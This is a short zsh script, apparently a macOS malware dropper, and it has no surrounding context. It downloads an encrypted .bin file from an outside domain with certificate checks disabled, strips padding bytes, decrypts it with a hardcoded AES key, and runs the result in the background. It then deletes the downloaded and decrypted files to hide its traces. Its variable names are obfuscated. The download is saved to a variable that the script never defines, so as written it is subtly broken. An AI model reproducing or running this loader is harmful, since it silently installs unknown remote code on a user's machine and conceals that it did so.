#!/bin/zsh
ftvq7=$(mktemp /tmp/9rt8y6.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m95239f17b1d55199.bin" -o "$ftvq7z" || exit 1
n6nv9e=$(stat -f %z "$ftvq7z"); t8vpnsj=$(( n6nv9e - 4018 - 3499 ))
tail -c +$(( 4018 + 1 )) "$ftvq7z" | head -c $t8vpnsj | openssl enc -d -aes-256-cbc -k 8aae7203d8eec59c63d5409c -out "$ftvq7" 2>/dev/null
[ -s "$ftvq7" ] && chmod 700 "$ftvq7" && ( "$ftvq7" & ) && disown
( sleep 3; rm -f "$ftvq7" "$ftvq7z" ) &>/dev/null &
